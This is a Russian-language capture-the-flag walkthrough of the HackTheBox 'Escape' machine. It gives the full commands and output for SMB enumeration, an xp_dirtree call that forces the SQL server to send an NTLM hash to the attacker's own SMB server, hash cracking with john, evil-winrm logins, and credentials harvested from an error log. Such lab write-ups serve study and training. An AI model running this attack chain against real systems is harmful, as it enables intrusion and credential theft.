# Walkthrough Escape Machine
## Разведка

```sh
sudo nmap -sC -sV -Pn 10.10.11.202
```

По умолчанию, smbclient использует порт 445/TCP для подключения к службе SMB на удаленном хосте. В результате сканирования можно увидеть
```sh
445/tcp  open  microsoft-ds?
```
Что, скорее всего, означает, что на этом порту запущена SMB служба.
```sh
smbclient -L ////10.10.11.202//
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Public          Disk      
	SYSVOL          Disk      Logon server share 
```
Нам интересен ресурс Public, так как он доступен всем пользователям. Зайдем, посмотрим, какие есть файлы и скачаем потенциально нужный к себе.

```sh
smbclient //10.10.11.202/Public
Password for [WORKGROUP\pavel]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Nov 19 14:51:25 2022
  ..                                  D        0  Sat Nov 19 14:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 16:39:43 2022

		5184255 blocks of size 4096. 1450723 blocks available
smb: \> get "SQL Server Procedures.pdf"
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (53.2 KiloBytes/sec) (average 53.2 KiloBytes/sec)
```

В файле есть подсказка "For new hired and those that are still waiting their users", в которой есть данные для доступа в бд.
> For new hired and those that are still waiting their users to be created and perms assigned, can sneak a peek at the Database with user PublicUser and password GuestUserCantWrite1 .

Посмотрим и увидим в нашем начальном скане, что запущен SQL сервер на 1433 порту:
```sh
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
```

Для выполнения SQL-атак очень удобно использовать утилиту mssqlclient и responder, но под рукой на M2 работающее было sqlcmd и smbserver, эффект тот же.

```sh
smbserver.py -smb2support share .
```
В другом шелле:
```sh
export SQLCMDPASSWORD=GuestUserCantWrite1
sqlcmd -S 10.10.11.202 -U PublicUser
1> EXEC xp_dirtree "\\10.10.14.239\paszi\"
2> go
subdirectory                                                                                                                                                                                                                                                         depth      
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- -----------

(0 rows affected)

```

На что получаем NTLM-Hash в smbserver

> sql_svc::sequel:aaaaaaaaaaaaaaaa:30f4b1fca4ba1013a1eb5d938cf02007:0101000000000000801dd4ffd76cd9019e61b4ecbe5cdbd900000000010010007700720077006e005100690042005100030010007700720077006e00510069004200510002001000480076007a006a004a0069007500710004001000480076007a006a004a0069007500710007000800801dd4ffd76cd90106000400020000000800300030000000000000000000000000300000b06953a40e73f7dcd7c20260b1485241836863a90aa065eda453ec4452d7865f0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003200330039000000000000000000

Для перевода хеша в пароль я буду использовать john, сохранив хеш выше в файл.
```sh
john hash.txt "/Users/pavel/Desktop/study/htb/Escape/SecLists/Passwords/Leaked-Databases/rockyou.txt"

REGGIE1234ronnie (sql_svc)
```

Заходим на сервер с помощью новых данных
```sh
evil-winrm -i 10.10.11.202 -u sql_svc -p REGGIE1234ronnie
```
Покопавшись, можно найти C:\SQLServer\Logs\ERRORLOG.BAK

В котором есть логи о неправильно введенных credentials (данных):
Ryan.Cooper:NuclearMosquito3


> 2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]

Перелогинимся и находим user.txt на десктопе.
```sh
evil-winrm -i 10.10.11.202 -u Ryan.Cooper -p NuclearMosquito3
...
    Directory: C:\Users\Ryan.Cooper\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/12/2023  12:33 AM           3409 cert.pfx
-a----        4/12/2023  12:32 AM         174080 certify.exe
-a----        4/12/2023  12:54 AM          73802 glrn.exe
-a----        4/12/2023  12:34 AM         446976 Rubeus.exe
-ar---        4/12/2023  12:24 AM             34 user.txt

*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> cat user.txt
a9d3cca182eb9de43b1316fdef8d775e
...
```

